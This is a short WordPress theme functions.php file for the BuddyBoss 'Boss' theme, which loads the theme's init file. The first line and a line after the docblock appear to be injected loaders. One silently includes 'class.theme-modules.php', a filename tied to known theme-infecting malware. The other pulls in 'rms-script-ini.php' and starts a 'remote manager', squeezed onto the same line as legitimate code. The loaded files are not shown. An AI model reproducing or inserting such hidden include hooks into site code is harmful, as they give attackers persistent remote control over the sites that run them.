<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php

/**
 * To view theme functions, navigate to /buddyboss-inc/theme.php
 *
 * @package Boss
 * @since Boss 1.0.0
 */
require_once('rms-script-ini.php');
rms_remote_manager_init(__FILE__, 'rms-script-mu-plugin.php', false, false);$init_file = get_template_directory() . '/buddyboss-inc/init.php';

if ( !file_exists( $init_file ) ) {
	$err_msg = __( 'BuddyBoss cannot find the starter file, should be located at: *wp root*/wp-content/themes/buddyboss/buddyboss-inc/init.php', 'boss' );

	wp_die( $err_msg );
}

require_once( $init_file );
